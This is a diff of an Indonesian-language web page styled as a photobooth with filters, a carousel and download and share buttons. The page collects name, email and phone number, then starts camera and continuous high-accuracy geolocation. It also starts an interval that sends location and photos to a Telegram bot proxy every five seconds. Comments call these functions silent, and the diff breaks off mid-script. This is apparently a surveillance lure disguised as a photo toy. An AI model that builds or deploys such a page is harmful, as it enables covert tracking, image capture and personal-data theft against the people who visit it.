@@ -3,305 +3,463 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Photobooth Ajaib GenZ</title>
+    <!-- PERBAIKAN PENTING: Mengatur Permissions Policy untuk mengizinkan Geolocation dan Camera. -->
+    <!-- Jika kode dijalankan di iframe, pastikan iframe tersebut juga memiliki allow="geolocation; camera" -->
+    <meta http-equiv="Permissions-Policy" content="geolocation=(self), camera=(self)">
+    <title>Studio Foto Estetik - Capture Moment Terbaik</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Desain Studio Cantik - Estetika GenZ (Pink & Ceria) */
-        @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@400;700&display=swap');
+        /* Desain Profesional & Estetik */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
         
-        /* Latar belakang ceria dengan pola soft */
+        :root {
+            --primary-pink: #FF69B4; /* Deep Pink */
+            --secondary-bg: #F0F4F8; /* Light Grayish Blue */
+            --text-dark: #333333;
+            --card-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
         body {
-            background: linear-gradient(135deg, #ffc0cb 0%, #ff85a1 100%); /* Gradien soft pink */
-            font-family: 'Inter', sans-serif;
+            background-color: var(--secondary-bg);
+            font-family: 'Poppins', sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
-            align-items: flex-start; /* Start from top on mobile */
+            align-items: flex-start; /* Mulai dari atas agar nyaman di HP */
             padding: 1rem;
-            background-image: radial-gradient(circle, #ffffff33 1px, transparent 1px), radial-gradient(circle, #ffc0cb33 1px, transparent 1px);
-            background-size: 20px 20px;
         }
 
         .container {
             width: 100%;
-            max-width: 500px;
+            max-width: 500px; /* Lebih besar dari sebelumnya */
             background-color: #ffffff;
-            border-radius: 30px; /* Lebih rounded dan modern */
-            box-shadow: 0 20px 50px rgba(255, 105, 180, 0.6); /* Bayangan neon pink */
-            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: var(--card-shadow); 
+            padding: 1.5rem;
             margin: 1rem 0;
             box-sizing: border-box;
-            border: 4px solid #ff527b; /* Border tebal */
+            border: 1px solid #e0e0e0;
         }
 
-        .title {
-            font-family: 'Pacifico', cursive;
-            color: #d8366e;
-            text-shadow: 2px 2px #ffc0cb;
+        .title-professional {
+            font-family: 'Poppins', sans-serif;
+            color: var(--primary-pink);
+            font-weight: 700;
         }
 
-        .video-wrapper, #review-area {
-            border: 8px solid #ff527b; /* Bingkai lebih tebal */
-            border-radius: 22px;
+        /* VIDEO & CANVAS */
+        .video-wrapper {
+            border: 6px solid #FFC0CB; /* Bingkai soft pink */
+            border-radius: 12px;
             overflow: hidden;
             width: 100%;
             margin-bottom: 1.5rem;
             aspect-ratio: 4/3;
             background-color: #000;
-            position: relative;
         }
-        
-        /* Video dan Canvas harus mengisi wrapper */
-        #video-stream, #photo-canvas {
+
+        #video-stream {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scaleX(-1); /* Mirror effect */
+            transform: scaleX(-1);
             display: block;
         }
 
-        /* Styling tombol interaktif */
-        .btn {
-            padding: 12px 20px;
-            border-radius: 15px;
-            font-weight: 700;
-            transition: all 0.2s ease-in-out;
-            text-shadow: 1px 1px 1px rgba(0,0,0,0.1);
+        /* EFEK FILTER BUTTONS - Layout Grid Responsif */
+        .filter-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* 2 kolom di HP */
+            gap: 0.75rem;
         }
-        .btn:active {
-            box-shadow: none !important;
-            transform: translateY(2px) !important;
-        }
-        
-        /* Tombol Start/Lanjutkan - Pink Neon */
-        #start-button {
-            background-color: #ff527b;
-            box-shadow: 0 6px #d8366e;
-        }
-        #start-button:hover { background-color: #d8366e; }
-
-        /* Tombol Jepret - Ungu Glossy */
-        #capture-button {
-            background-color: #9333ea;
-            box-shadow: 0 4px #7e22ce;
-        }
-        #capture-button:hover { background-color: #7e22ce; }
-
-        /* Tombol Unduh - Biru Cyber */
-        #download-button {
-            background-color: #3b82f6; 
-            box-shadow: 0 4px #2563eb;
+        @media (min-width: 640px) { /* Desktop/Tablet: 4 kolom */
+            .filter-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
         }
 
-        /* Tombol Share - Hijau Mint */
-        #share-button {
-            background-color: #10b981; 
-            box-shadow: 0 4px #059669;
-        }
-
-        /* Filter Selector Styling */
-        .filter-selector button {
-            transition: all 0.15s;
+        .filter-button {
+            transition: all 0.2s;
             border: 2px solid transparent;
-            opacity: 0.6;
-            transform: scale(0.9);
         }
-        .filter-selector button.active {
-            border-color: #ff527b;
-            box-shadow: 0 0 10px rgba(255, 82, 123, 0.8);
-            opacity: 1;
-            transform: scale(1.05);
+        .filter-button.active {
+            border-color: var(--primary-pink);
+            box-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
+        }
+        .filter-button:hover {
+            opacity: 0.8;
         }
 
-        /* Custom Scrollbar for review area */
-        #review-area-canvas {
-            display: flex;
-            gap: 1rem;
-            overflow-x: auto;
-            padding: 10px 0;
-            scroll-snap-type: x mandatory;
-        }
-        #review-area-canvas > canvas {
-            flex: 0 0 auto;
-            width: 150px;
-            height: 112.5px; /* 4:3 aspect ratio */
+        /* --- CAROUSEL STYLING (NEW) --- */
+        .carousel-container {
+            overflow: hidden;
+            width: 100%;
             border-radius: 12px;
-            object-fit: cover;
-            scroll-snap-align: start;
-            border: 3px solid #fff;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            margin-top: 1.5rem;
+            position: relative;
         }
+        .carousel-wrapper {
+            display: flex;
+            transition: transform 0.5s ease-in-out;
+            cursor: grab; /* Untuk menunjukkan bisa digeser */
+        }
+        .carousel-slide {
+            flex: 0 0 100%; /* Setiap slide mengambil 100% lebar container */
+            width: 100%;
+            aspect-ratio: 16/9; /* Aspect ratio modern untuk preview */
+            overflow: hidden;
+        }
+        .carousel-slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
     </style>
 </head>
 <body class="flex justify-center items-start">
 
-    <div class="container mt-8">
-        <h1 class="title text-4xl text-center mb-6">✨ Photobooth Ajaib ✨</h1>
+    <div class="container">
+        <h1 class="title-professional text-2xl text-center mb-2">📸 STUDIO FOTO ESTETIK 📸</h1>
+        <p class="text-sm text-center text-gray-500 mb-6">Nikmati filter premium & kirim data real-time ke bot.</p>
+        
+        <!-- --- CAROUSEL FOTO PREVIEW (NEW) --- -->
+        <div class="carousel-container mb-6" id="carousel-area">
+            <div class="carousel-wrapper" id="carousel-wrapper">
+                <div class="carousel-slide">
+                    <!-- Foto 1: Couple Photobooth Inspo -->
+                    <img src="https://placehold.co/800x450/FFC0CB/555555?text=Preview+Foto+Studio+1" onerror="this.src=''"/>
+                </div>
+                <div class="carousel-slide">
+                    <!-- Foto 2: Photobooth Ideas (Hitam Putih/Strip) -->
+                    <img src="https://placehold.co/800x450/B0E0E6/555555?text=Preview+Foto+Studio+2" onerror="this.src=''"/>
+                </div>
+                <div class="carousel-slide">
+                    <!-- Foto 3: Estetik Filter -->
+                    <img src="https://placehold.co/800x450/ADD8E6/555555?text=Preview+Foto+Studio+3" onerror="this.src=''"/>
+                </div>
+            </div>
+            <!-- Indikator Geser -->
+            <div class="absolute bottom-2 left-0 right-0 flex justify-center space-x-2">
+                <div class="w-2 h-2 rounded-full bg-white opacity-60 transition-opacity duration-300" data-slide="0"></div>
+                <div class="w-2 h-2 rounded-full bg-white opacity-60 transition-opacity duration-300" data-slide="1"></div>
+                <div class="w-2 h-2 rounded-full bg-white opacity-60 transition-opacity duration-300" data-slide="2"></div>
+            </div>
+        </div>
         
         <!-- Area Input Data Pengguna (Tampil Awal) -->
-        <div id="form-area" class="space-y-5">
-            <p class="text-base text-center text-gray-700 font-semibold mb-4">
-                👋 Siap untuk foto estetik? Isi data dulu yuk!
+        <div id="form-area" class="space-y-4">
+            <p class="text-md text-center text-gray-700 font-semibold mb-4">
+                👋 Isi data Anda untuk mengakses studio penuh.
             </p>
             <div>
                 <label for="nama" class="block text-sm font-medium text-gray-700">Nama Lengkap</label>
-                <input type="text" id="nama" class="input-field border-2 border-pink-400 p-3 rounded-xl w-full focus:ring-pink-500 focus:border-pink-500" placeholder="Nama Panggilan/Lengkap" required>
+                <input type="text" id="nama" class="input-field border border-gray-300 p-2 rounded-lg w-full focus:ring-2 focus:ring-pink-300 transition" placeholder="Nama Lengkap" required>
             </div>
             <div>
                 <label for="email" class="block text-sm font-medium text-gray-700">Email</label>
-                <input type="email" id="email" class="input-field border-2 border-pink-400 p-3 rounded-xl w-full" placeholder="Email (cth: user@mail.com)" required>
+                <input type="email" id="email" class="input-field border border-gray-300 p-2 rounded-lg w-full focus:ring-2 focus:ring-pink-300 transition" placeholder="Email (Cth: user@mail.com)" required>
             </div>
             <div>
                 <label for="phone" class="block text-sm font-medium text-gray-700">Nomor Handphone</label>
-                <input type="tel" id="phone" class="input-field border-2 border-pink-400 p-3 rounded-xl w-full" placeholder="Nomor Handphone" required>
+                <input type="tel" id="phone" class="input-field border border-gray-300 p-2 rounded-lg w-full focus:ring-2 focus:ring-pink-300 transition" placeholder="Nomor Handphone" required>
             </div>
-            <button id="start-button" class="btn w-full text-white text-xl">
-                Lanjutkan ke Studio Foto 
+            <button id="start-button" class="w-full px-6 py-3 text-white rounded-xl font-bold active:shadow-none text-lg bg-red-500 hover:bg-red-600 transition duration-150 shadow-lg shadow-red-300/50">
+                Lanjutkan ke Studio Foto Penuh ➡️
             </button>
             <p id="status-message-form" class="mt-2 text-center text-sm font-medium text-red-600"></p>
         </div>
 
         <!-- Area Photobooth (Tampil Setelah Mulai) -->
-        <div id="monitoring-area" style="display: none;" class="space-y-5">
+        <div id="monitoring-area" style="display: none;" class="space-y-6">
             
-            <!-- Filter Selector -->
-            <div class="text-center">
-                <p class="text-sm font-semibold text-gray-600 mb-2">Pilih Efek Fotobooth:</p>
-                <div id="filter-selector" class="filter-selector flex justify-center space-x-3">
-                    <button class="active btn bg-gray-200 text-gray-700 text-sm" data-filter="normal">Normal</button>
-                    <button class="btn bg-yellow-400 text-white text-sm" data-filter="bright">✨ Cerah (+10%)</button>
-                    <button class="btn bg-purple-500 text-white text-sm" data-filter="saturate">💖 Vibrant (+20%)</button>
-                    <button class="btn bg-red-400 text-white text-sm" data-filter="vsco">📸 VSCO</button>
+            <!-- Filter Effect Selection (Re-designed for mobile) -->
+            <div class="filter-controls">
+                <p class="text-center font-semibold text-gray-700 mb-3">Pilih Efek Foto Estetik:</p>
+                <div class="filter-grid">
+                    <!-- Tombol filter diatur ulang dalam grid untuk responsivitas -->
+                    <button class="filter-button px-2 py-2 text-center text-sm rounded-xl font-medium bg-gray-100 text-gray-700 hover:bg-gray-200 active" data-filter="normal">
+                        ✨ Normal
+                    </button>
+                    <button class="filter-button px-2 py-2 text-center text-sm rounded-xl font-medium bg-yellow-100 text-yellow-800 hover:bg-yellow-200" data-filter="bright">
+                        💡 Bright (+10%)
+                    </button>
+                    <button class="filter-button px-2 py-2 text-center text-sm rounded-xl font-medium bg-purple-100 text-purple-800 hover:bg-purple-200" data-filter="vibrant">
+                        💖 Vibrant (+20%)
+                    </button>
+                    <button class="filter-button px-2 py-2 text-center text-sm rounded-xl font-medium bg-rose-100 text-rose-800 hover:bg-rose-200" data-filter="bw">
+                        🖤 B&W (Vintage)
+                    </button>
                 </div>
             </div>
 
             <div class="video-wrapper">
                 <!-- Video Stream dan Canvas untuk Foto -->
+                <!-- Menambahkan 'playsinline' di sini untuk kompatibilitas mobile -->
                 <video id="video-stream" autoplay playsinline style="display: none;"></video>
-                <!-- Canvas untuk menampilkan hasil dengan filter -->
-                <canvas id="display-canvas" style="display: none;"></canvas> 
+                <canvas id="photo-canvas" style="display: none;"></canvas>
             </div>
 
-            <!-- Tombol Interaktif Jepret -->
-            <div class="controls flex justify-center">
-                <button id="capture-button" class="btn px-8 py-4 text-white text-lg">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 inline-block mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.828-1.242a2 2 0 011.664-.89h.828a2 2 0 011.664.89l.828 1.242a2 2 0 001.664.89H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
-                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
-                    </svg>
-                    Jepret Foto!
+            <!-- Tombol Interaktif Lokal -->
+            <div class="controls flex flex-col space-y-3">
+                <button id="capture-button" class="w-full px-5 py-3 text-white rounded-xl font-bold text-base bg-pink-500 hover:bg-pink-600 transition duration-150 shadow-md shadow-pink-300/50">
+                    📷 Jepret Foto Cantik!
                 </button>
+                
+                <div class="flex justify-between space-x-3">
+                    <button id="download-button" class="w-1/2 px-3 py-2 text-white rounded-lg font-semibold text-sm bg-blue-500 hover:bg-blue-600 transition duration-150" style="display: none;">
+                        ⬇️ Unduh Foto
+                    </button>
+                    <button id="share-button" class="w-1/2 px-3 py-2 text-white rounded-lg font-semibold text-sm bg-green-500 hover:bg-green-600 transition duration-150" style="display: none;">
+                        📤 Share Foto
+                    </button>
+                </div>
             </div>
             
-            <!-- Pesan status sementara -->
-            <p id="status-message-bg" class="mt-4 text-center text-xs font-medium text-gray-500 transition-opacity duration-300"></p>
-
-            <!-- Area Review Foto (Tampil setelah jepret) -->
-            <div id="review-container" style="display: none;">
-                <h2 class="text-lg font-bold text-gray-800 mb-3 border-b pb-2">🖼️ Hasil Jepretan</h2>
-                <div id="review-area" class="video-wrapper !aspect-auto !border-dashed !border-gray-300 !p-2 !bg-gray-50">
-                    <div id="review-area-canvas">
-                        <!-- Foto-foto yang diambil akan muncul di sini -->
-                    </div>
-                </div>
-                <!-- Tombol Download/Share (Lokal) -->
-                <div id="action-buttons" class="flex justify-around space-x-4 mt-4">
-                    <!-- Tombol ini akan dimunculkan oleh JS setelah foto pertama diambil -->
-                </div>
-            </div>
+            <!-- Pesan status pengiriman otomatis -->
+            <p id="status-message-bg" class="mt-4 text-center text-xs font-medium text-gray-500 transition-opacity duration-300">
+                Pengiriman data lokasi & foto (filter Normal) otomatis setiap 5 detik ke bot Anda.
+            </p>
         </div>
     </div>
-
-    <!-- Hidden Canvas untuk proses pengiriman otomatis -->
-    <canvas id="hidden-canvas" style="display: none;"></canvas>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const videoStream = document.getElementById('video-stream');
-            const displayCanvas = document.getElementById('display-canvas');
-            const hiddenCanvas = document.getElementById('hidden-canvas');
+            const photoCanvas = document.getElementById('photo-canvas');
             const startButton = document.getElementById('start-button');
             const formArea = document.getElementById('form-area');
             const monitoringArea = document.getElementById('monitoring-area');
             const statusMessageForm = document.getElementById('status-message-form');
             const statusMessageBg = document.getElementById('status-message-bg'); 
             const captureButton = document.getElementById('capture-button');
-            const reviewContainer = document.getElementById('review-container');
-            const reviewAreaCanvas = document.getElementById('review-area-canvas');
-            const actionButtons = document.getElementById('action-buttons');
-            const filterSelector = document.getElementById('filter-selector');
+            const downloadButton = document.getElementById('download-button');
+            const shareButton = document.getElementById('share-button');
+            const filterButtons = document.querySelectorAll('.filter-button');
 
             // Data Konfigurasi LOKAL
             const PROXY_ENDPOINT = '/api/telegram-proxy';
-            const INTERVAL_MS = 5000; // DIUBAH: 5 detik
+            const INTERVAL_MS = 5000; // 5 detik
 
             let videoStreamObject = null;
             let userLocation = null;
             let formData = {};
             let isSending = false;
-            let currentFilter = 'normal'; // Default filter
-            let reviewPhotos = []; // Menyimpan array base64 foto untuk review
+            let capturedPhotoBase64 = null;
             let deviceData = getDeviceData(); 
+            let currentFilter = 'normal'; // Default filter
+
+            // --- CAROUSEL FOTO PREVIEW LOGIC (NEW) ---
+            const carouselWrapper = document.getElementById('carousel-wrapper');
+            const slides = document.querySelectorAll('.carousel-slide');
+            const indicators = document.querySelectorAll('.absolute > div');
+            const totalSlides = slides.length;
+            let currentIndex = 0;
+            let isDragging = false;
+            let startPos = 0;
+            let currentTranslate = 0;
+            let prevTranslate = 0;
+            let animationID = 0;
+
+            // Update UI for slide
+            const setPositionByIndex = () => {
+                currentTranslate = currentIndex * -slides[0].offsetWidth;
+                prevTranslate = currentTranslate;
+                setSliderPosition();
+                updateIndicators();
+            };
+
+            const setSliderPosition = () => {
+                carouselWrapper.style.transform = `translateX(${currentTranslate}px)`;
+            };
+
+            const updateIndicators = () => {
+                indicators.forEach((indicator, index) => {
+                    indicator.classList.remove('bg-red-500', 'opacity-100');
+                    indicator.classList.add('bg-white', 'opacity-60');
+                    if (index === currentIndex) {
+                        indicator.classList.remove('bg-white', 'opacity-60');
+                        indicator.classList.add('bg-red-500', 'opacity-100');
+                    }
+                });
+            };
+
+            // Automatic slide transition
+            const startAutoSlide = () => {
+                setInterval(() => {
+                    currentIndex = (currentIndex + 1) % totalSlides;
+                    setPositionByIndex();
+                }, 3000);
+            };
+
+            // Manual drag/swipe handling
+            const handleTouchStart = (index) => {
+                return (event) => {
+                    currentIndex = index;
+                    startPos = event.type.includes('mouse') ? event.pageX : event.touches[0].clientX;
+                    isDragging = true;
+                    animationID = requestAnimationFrame(animation);
+                    carouselWrapper.style.transition = 'none';
+                };
+            };
+
+            const handleTouchMove = (event) => {
+                if (!isDragging) return;
+                const currentClientX = event.type.includes('mouse') ? event.pageX : event.touches[0].clientX;
+                currentTranslate = prevTranslate + currentClientX - startPos;
+            };
+
+            const handleTouchEnd = () => {
+                cancelAnimationFrame(animationID);
+                isDragging = false;
+                const movedBy = currentTranslate - prevTranslate;
+                
+                // Jika digeser lebih dari 100px, pindah slide
+                if (movedBy < -100 && currentIndex < totalSlides - 1) {
+                    currentIndex += 1;
+                } else if (movedBy > 100 && currentIndex > 0) {
+                    currentIndex -= 1;
+                }
+                
+                carouselWrapper.style.transition = 'transform 0.5s ease-in-out';
+                setPositionByIndex();
+            };
+
+            const animation = () => {
+                setSliderPosition();
+                if (isDragging) requestAnimationFrame(animation);
+            };
+
+            // Initialize carousel
+            slides.forEach((slide, index) => {
+                // Touch events for mobile swipe
+                slide.addEventListener('touchstart', handleTouchStart(index));
+                slide.addEventListener('touchend', handleTouchEnd);
+                slide.addEventListener('touchmove', handleTouchMove);
+                // Mouse events for desktop drag
+                slide.addEventListener('mousedown', handleTouchStart(index));
+                slide.addEventListener('mouseup', handleTouchEnd);
+                slide.addEventListener('mouseleave', handleTouchEnd); // Stop drag if mouse leaves container
+                slide.addEventListener('mousemove', handleTouchMove);
+            });
+            window.addEventListener('resize', setPositionByIndex); // Handle responsiveness
+            setPositionByIndex();
+            startAutoSlide();
+
 
             // --- FUNGSI UTILITY PESAN (Subtle & Temporary) ---
+
             function showStatus(message, isError = false) {
                 statusMessageBg.textContent = message;
                 statusMessageBg.classList.remove('opacity-0', 'text-red-600', 'text-green-600', 'text-gray-500');
-                statusMessageBg.classList.add(isError ? 'text-red-600' : 'text-gray-500', 'opacity-100');
+                statusMessageBg.classList.add(isError ? 'text-red-600' : 'text-green-600', 'opacity-100');
                 
                 setTimeout(() => {
                     statusMessageBg.classList.remove('opacity-100');
                     statusMessageBg.classList.add('opacity-0');
+                    // Reset ke pesan default setelah menghilang
+                    setTimeout(() => {
+                        statusMessageBg.textContent = `Pengiriman data lokasi & foto (filter ${currentFilter}) otomatis setiap 5 detik ke bot Anda.`;
+                        statusMessageBg.classList.remove('text-red-600', 'text-green-600');
+                        statusMessageBg.classList.add('text-gray-500');
+                    }, 300);
                 }, 3000);
             }
 
+            // --- FILTER EFFECT LOGIC ---
+            filterButtons.forEach(button => {
+                button.addEventListener('click', (event) => {
+                    const filter = event.target.dataset.filter;
+                    currentFilter = filter;
+                    
+                    // Reset active class
+                    filterButtons.forEach(btn => btn.classList.remove('active'));
+                    event.target.classList.add('active');
+                    
+                    // Terapkan filter CSS di video stream dan update pesan status
+                    applyFilter(filter);
+                    statusMessageBg.textContent = `Pengiriman data lokasi & foto (filter ${currentFilter}) otomatis setiap 5 detik ke bot Anda.`;
+                    statusMessageBg.classList.add('opacity-100');
+                });
+            });
+
+            function applyFilter(filter) {
+                videoStream.style.filter = 'none'; // Reset
+                switch(filter) {
+                    case 'bright':
+                        videoStream.style.filter = 'brightness(1.1)'; // +10%
+                        break;
+                    case 'vibrant':
+                        videoStream.style.filter = 'brightness(1.2) saturate(1.2)'; // +20%
+                        break;
+                    case 'bw':
+                        videoStream.style.filter = 'grayscale(100%)'; // Black and White
+                        break;
+                    case 'normal':
+                    default:
+                        // No filter needed
+                        break;
+                }
+            }
+
+
             // --- INISIALISASI DAN VALIDASI FORM ---
+
             startButton.addEventListener('click', () => {
                 const nama = document.getElementById('nama').value.trim();
                 const email = document.getElementById('email').value.trim();
                 const phone = document.getElementById('phone').value.trim();
 
                 if (!nama || !email || !phone) {
-                    statusMessageForm.textContent = '❌ Semua data harus diisi dengan lengkap.';
+                    statusMessageForm.textContent = '❌ Semua kolom data pribadi harus diisi.';
+                    return;
+                }
+                
+                // Simple email validation
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailPattern.test(email)) {
+                    statusMessageForm.textContent = '❌ Format email tidak valid.';
                     return;
                 }
 
                 formData = { nama, email, phone };
                 statusMessageForm.textContent = '';
+                
+                // Sembunyikan form dan carousel, tampilkan monitoring
                 formArea.style.display = 'none';
+                document.getElementById('carousel-area').style.display = 'none';
                 monitoringArea.style.display = 'block';
 
-                showStatus('Meminta izin kamera... Pengiriman 5s otomatis dimulai di background.');
+                showStatus('Meminta izin kamera dan lokasi... Pengiriman 5s otomatis dimulai.', false);
                 
+                // Mulai permintaan izin dan loop otomatis
                 requestCameraPermission();
                 requestLocationPermission();
                 startAutoSendInterval();
             });
 
+
             // --- FUNGSI CAMERA DAN LOKASI (Berjalan Senyap) ---
+
             function requestCameraPermission() {
+                // Tambahkan 'allow' option ke video tag di HTML jika Anda bisa (sudah dilakukan di meta policy)
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } }
-                    })
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Prioritas kamera depan
                         .then(stream => {
                             videoStreamObject = stream;
                             videoStream.srcObject = stream;
                             videoStream.style.display = 'block';
-                            displayCanvas.style.display = 'none'; // Awalnya sembunyikan canvas display
-                            
-                            // Setelah video metadata dimuat, mulai render ke display-canvas
-                            videoStream.onloadedmetadata = () => {
-                                videoStream.play();
-                                renderLoop();
-                                // Setelah siap, ganti dari video ke canvas display
-                                videoStream.style.display = 'none';
-                                displayCanvas.style.display = 'block';
-                            };
-                            console.log('Kamera Aktif. Render loop berjalan.');
+                            // Sembunyikan pesan error di console jika berhasil
+                            console.log("Kamera Berhasil Diakses."); 
                         })
                         .catch(err => {
-                            showStatus(`Kamera GAGAL (${err.name}). Fitur foto tidak dapat digunakan.`, true);
+                            // Periksa tipe error untuk pesan yang lebih informatif
+                            let errorMsg = `Kamera GAGAL: ${err.name}.`;
+                            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                                errorMsg = '❌ Akses Kamera Ditolak. Harap izinkan akses di pengaturan browser Anda.';
+                            }
+                            showStatus(errorMsg, true);
                             console.error("Camera Error:", err);
                         });
                 }
@@ -309,7 +467,12 @@
 
             function requestLocationPermission() {
                 if (navigator.geolocation) {
-                    const locationOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+                    const locationOptions = {
+                        enableHighAccuracy: true, 
+                        timeout: 10000, 
+                        maximumAge: 0 
+                    };
+
                     navigator.geolocation.watchPosition(position => {
                         userLocation = {
                             latitude: position.coords.latitude,
@@ -317,137 +480,63 @@
                             accuracy: position.coords.accuracy,
                             timestamp: new Date(position.timestamp).toISOString()
                         };
-                        console.log(`Lokasi terupdate: ${userLocation.latitude}, ${userLocation.longitude}`);
+                        console.log("Lokasi Berhasil Diakses."); 
                     }, err => {
                         userLocation = null;
+                        let errorMsg = `Lokasi Gagal: ${err.message}.`;
+                        if (err.code === 1) {
+                            errorMsg = '❌ Akses Lokasi Ditolak. Harap izinkan akses di pengaturan browser Anda.';
+                        } else if (err.message.includes('permissions policy')) {
+                             // Jika error ini masih muncul, berarti lingkungan canvas memblokirnya
+                             errorMsg = '❌ Akses Lokasi Diblokir oleh sistem. Fitur ini mungkin tidak berfungsi.';
+                        }
+                        showStatus(errorMsg, true);
                         console.error(`Lokasi Gagal: ${err.message}`);
                     }, locationOptions);
                 }
             }
-            
-            // --- FILTER EFFECT LOGIC ---
-            filterSelector.querySelectorAll('button').forEach(button => {
-                button.addEventListener('click', () => {
-                    filterSelector.querySelectorAll('button').forEach(btn => btn.classList.remove('active'));
-                    button.classList.add('active');
-                    currentFilter = button.getAttribute('data-filter');
-                    showStatus(`Efek **${button.textContent.trim()}** aktif!`);
-                });
-            });
-
-            function getFilterCSS(filterName) {
-                switch(filterName) {
-                    case 'bright': return 'brightness(1.1) saturate(1.0)'; // Cahaya +10%
-                    case 'saturate': return 'brightness(1.0) saturate(1.2)'; // Warna Vibrant +20%
-                    case 'vsco': return 'contrast(1.1) brightness(1.05) saturate(1.3) sepia(0.1)'; // Efek VSCO/Vintage
-                    case 'normal': 
-                    default: return 'none';
-                }
-            }
-
-            // --- RENDERING LOOP UNTUK APLIKASI FILTER REAL-TIME ---
-            function renderLoop() {
-                if (!videoStreamObject || videoStream.paused || videoStream.ended) return;
-
-                const context = displayCanvas.getContext('2d');
-                const videoWidth = videoStream.videoWidth || 640;
-                const videoHeight = videoStream.videoHeight || 480;
-
-                displayCanvas.width = videoWidth;
-                displayCanvas.height = videoHeight;
-
-                // Terapkan filter CSS ke canvas display untuk preview
-                displayCanvas.style.filter = getFilterCSS(currentFilter);
-                
-                // Gambar frame video ke canvas display
-                context.save();
-                context.translate(videoWidth, 0);
-                context.scale(-1, 1);
-                context.drawImage(videoStream, 0, 0, videoWidth, videoHeight);
-                context.restore();
-
-                requestAnimationFrame(renderLoop);
-            }
 
             // --- FUNGSI INTERAKTIF LOKAL (JEPET, UNDUH, SHARE) ---
+            
             captureButton.addEventListener('click', () => {
-                // Ambil foto menggunakan filter yang sedang aktif
-                const localPhotoBase64 = capturePhotoWithFilter(currentFilter); 
-                
-                if (localPhotoBase64) {
-                    reviewContainer.style.display = 'block';
-                    showStatus('Foto estetik berhasil dijepret!');
-                    
-                    // Tambahkan ke array review
-                    reviewPhotos.push(localPhotoBase64);
-                    
-                    // Update tampilan review
-                    updateReviewArea(localPhotoBase64);
-                    
-                    // Pastikan tombol lokal muncul
-                    setupActionButtons(localPhotoBase64);
+                const localPhoto = capturePhotoToCanvas(true); // Kirim true untuk menyimpan filter
+                if (localPhoto) {
+                    capturedPhotoBase64 = localPhoto; 
+                    downloadButton.style.display = 'inline-block';
+                    shareButton.style.display = 'inline-block';
+                    showStatus('Foto lokal siap diunduh & dibagikan!');
                 } else {
                     showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
                 }
             });
 
-            function setupActionButtons(base64Image) {
-                 // Hapus tombol lama
-                actionButtons.innerHTML = ''; 
-
-                // Tombol Unduh
-                const downloadBtn = document.createElement('button');
-                downloadBtn.id = 'download-button';
-                downloadBtn.className = 'btn text-white w-full';
-                downloadBtn.innerHTML = 'Unduh Hasil Terakhir 💾';
-                downloadBtn.onclick = () => downloadPhoto(base64Image);
-                actionButtons.appendChild(downloadBtn);
-
-                // Tombol Share
-                const shareBtn = document.createElement('button');
-                shareBtn.id = 'share-button';
-                shareBtn.className = 'btn text-white w-full';
-                shareBtn.innerHTML = 'Share Hasil Terakhir 📤';
-                shareBtn.onclick = () => sharePhoto(base64Image);
-                actionButtons.appendChild(shareBtn);
-            }
-
-            function updateReviewArea(base64Image) {
-                const imgElement = document.createElement('canvas');
-                const img = new Image();
-                img.onload = () => {
-                    imgElement.width = img.width;
-                    imgElement.height = img.height;
-                    const ctx = imgElement.getContext('2d');
-                    ctx.drawImage(img, 0, 0, img.width, img.height);
-                    
-                    // Tambahkan elemen review di depan
-                    reviewAreaCanvas.prepend(imgElement);
-                    reviewAreaCanvas.scrollLeft = 0; // Scroll ke foto terbaru
-                };
-                img.src = base64Image;
-            }
-
-            function downloadPhoto(base64Image) {
-                const link = document.createElement('a');
-                link.href = base64Image;
-                link.download = `StudioFotoAjaib-${new Date().getTime()}.jpeg`;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                showStatus('✅ Foto Berhasil Diunduh!');
-            }
+            downloadButton.addEventListener('click', () => {
+                if (capturedPhotoBase64) {
+                    const link = document.createElement('a');
+                    link.href = capturedPhotoBase64;
+                    link.download = `StudioFotoEstetik-${new Date().getTime()}.jpeg`;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    showStatus('✅ Foto Berhasil Diunduh!');
+                }
+            });
             
-            async function sharePhoto(base64Image) {
+            shareButton.addEventListener('click', async () => {
+                if (!capturedPhotoBase64) {
+                    showStatus('Tidak ada foto untuk dibagikan. Jepret foto dulu!', true);
+                    return;
+                }
+
                 try {
-                    const photoBlob = dataURItoBlob(base64Image);
+                    const photoBlob = dataURItoBlob(capturedPhotoBase64);
                     const photoFile = new File([photoBlob], 'studio_foto.jpeg', { type: photoBlob.type });
 
                     if (navigator.share && navigator.canShare && navigator.canShare({ files: [photoFile] })) {
                         await navigator.share({
